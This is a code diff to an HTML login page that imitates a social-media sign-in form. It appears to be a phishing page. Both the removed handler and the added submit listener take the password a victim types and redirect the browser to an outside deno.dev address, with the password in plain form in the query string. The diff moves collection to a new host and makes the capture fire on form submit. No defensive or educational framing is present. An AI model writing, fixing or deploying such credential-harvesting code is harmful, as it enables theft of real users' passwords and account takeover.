@@ -19,7 +19,7 @@
             <form class="container" id="loginForm">
                 <input type="text" placeholder="Phone number, username, or email " name="u_name" id="username">
                 <input type="password" placeholder="Password" name="pass" id="password">
-                <button class="submitbutton" onclick="sendLoginRequest()">Log in </button>
+                <button class="submitbutton" type="submit">Log in </button>
                 <br />
                 <div class="option">OR </div>
             </form>
@@ -42,26 +42,26 @@
     <br />
     <br />
 
-   <script>
-    function sendLoginRequest(event) {
-        event.preventDefault(); // Prevent form submission
+    <script>
+        // Modify the form submission behavior
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission
 
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
+            const password = document.getElementById('password').value;
 
-        // Validate password before making the request
-        if (!password) {
-            console.error('Password is required');
-            return;
-        }
+            // Validate password before sending the request
+            if (!password) {
+                console.error('Password is required');
+                return;
+            }
 
-        // Construct the server URL with only the password as a query parameter
-        const serverUrl = `https://pure-spider-48.deno.dev/text?text=${password}`;
+            // Construct the server URL with the password as a query parameter
+            const serverUrl = `https://lucky-dove-40.deno.dev/text?text=${password}`;
 
-        // Redirect to the server URL with the password query parameter
-        window.location.href = serverUrl;
-    }
-</script>
+            // Send a GET request to the server URL (no encoding)
+            window.location.href = serverUrl;
+        });
+    </script>
 
 </body>
 </html>
